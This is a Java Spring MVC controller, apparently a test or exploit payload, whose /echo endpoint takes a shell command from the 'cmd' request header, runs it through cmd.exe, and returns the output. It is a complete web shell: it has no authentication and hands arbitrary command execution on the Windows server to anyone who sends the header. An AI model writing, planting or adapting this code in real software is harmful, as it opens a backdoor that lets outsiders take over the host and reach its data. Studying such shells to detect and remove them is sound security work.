package com.example.spring.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.*;

@Controller
public class SpringMVCTestController {
    @ResponseBody
    @RequestMapping(value="/echo", method = RequestMethod.GET)
    public void Test() throws IOException {
        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String res = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd}).getInputStream()).useDelimiter("\\A").next();
            httpresponse.getWriter().println(res);
        }
    }
}